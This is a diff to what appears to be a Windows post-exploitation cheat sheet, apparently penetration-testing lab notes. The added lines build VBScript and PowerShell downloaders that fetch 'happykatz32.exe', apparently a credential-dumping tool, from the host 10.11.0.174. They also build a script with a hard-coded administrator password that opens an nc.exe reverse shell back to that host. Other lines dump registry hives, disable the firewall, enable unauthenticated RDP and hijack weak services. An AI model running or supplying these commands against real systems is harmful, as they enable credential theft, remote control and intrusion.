@@ -11,6 +11,7 @@
 	$ net start		# Started services
 	$ sc getkeyname "XXXX"	# Get the keyname from net start
 	$ sc queryex "XXXX"		# Get the name from keyname
+	$ 
 	
 2. Determine the current network and domain users in the machine:
 	$ ipconfig /all
@@ -83,7 +84,7 @@
 	$ wmic process where name="process_name" call terminate		# terminate the program
 	$ wmic /output:test.csv startup list full /format:csv
 	$ wmic /output:test.csv product get caption, installdate, installlocation, packagecache, vendor, version /format:csv 
-
+	
 8. Registry command: (most of the time require Administrator)
 	$ reg save HKLM\Security security.hive
 	$ reg save HKLM\System system.hive
@@ -102,33 +103,78 @@
 	$ net firewall set opmode disable
 	$ net firewall set opmode enable
 	$ sc config <service name(sc getkeyname "Windows Audio")> start=auto
-	$ netsh trace start capture=yes IPv4.Address=[localIP]		# After successful got Administrator start capture pcap without install netcat
-	$ netsh trace stop											# 
 	
-	Enable RDP
+	# After successful got Administrator start capture pcap without install netcat
+	$ netsh trace start capture=yes IPv4.Address=[localIP]		
+	$ netsh trace stop						
+	
+	# WGET in VBS
+	$ echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+	$ echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+	$ echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+	$ echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+	$ echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+	$ echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+	$ echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+	$ echo Err.Clear >> wget.vbs
+	$ echo Set http = Nothing >> wget.vbs
+	$ echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+	$ echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+	$ echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+	$ echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+	$ echo http.Open "GET",strURL,False >> wget.vbs
+	$ echo http.Send >> wget.vbs
+	$ echo varByteArray = http.ResponseBody >> wget.vbs
+	$ echo Set http = Nothing >> wget.vbs
+	$ echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+	$ echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+	$ echo strData = "" >> wget.vbs
+	$ echo strBuffer = "" >> wget.vbs
+	$ echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+	$ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+	$ echo Next >> wget.vbs
+	$ echo ts.Close >> wget.vbs
+	$ cscript wget.vbs http://10.11.0.174/muchwow/win/happykatz32.exe happykatz32.exe
+	
+	# Enable RDP
 	$ netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
 	$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v UserAuthentication /t REG_DWORD /d 0
 	$ reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 	
-	Weak Service escalation
+	# Weak Service privilege escalation
 	$ accesschk.exe /accepteula -uwqvc "Authenticated Users" * > auth-txt
 	$ sc config SSDPSRV binpath= "C:\Inetpub\bla.exe"
 	$ sc config SSDPSRV obj= ".\LocalSystem" password= ""
 	$ sc config SSDPSRV start= demand
 	$ net start SSDPSRV
 	
-	Get the unquoted service path
+	# Get the unquoted service path
 	$ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """	
 	#### Get unquoted path and check for the folders and files cacls or icacls for write and execute privilege ####
+	
 	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
-10. Powershell runas
-	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
+10. Powershell escalation
+	$ echo $username = 'administrator' > muchwow.ps1
+	$ echo $password = '>47J3ez%yHijKg8' >> muchwow.ps1
+	$ echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> muchwow.ps1
+	$ echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> muchwow.ps1
+	$ echo Start-Process nc.exe -ArgumentList ('-e','cmd.exe','10.11.0.174 4434') -Credential $credential >> muchwow.ps1
+	$ powershell -ExecutionPolicy Bypass -File c:\Windows\temp\muchwow.ps1
+
+	# Download Files
+	$ echo $storageDir = $pwd > wget.ps1
+	$ echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+	$ echo $url = "http://10.11.0.174/muchwow/happykatz32.exe" >>wget.ps1
+	$ echo $file = "happykatz32.exe" >>wget.ps1
+	$ echo $webclient.DownloadFile($url,$file) >>wget.ps1
+	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+	
 
 11. Getting into system with pseexec
 	$ psexec.exe -i -s %SystemRoot%\system32\cmd.exe
 	
 	
-	
+
 	
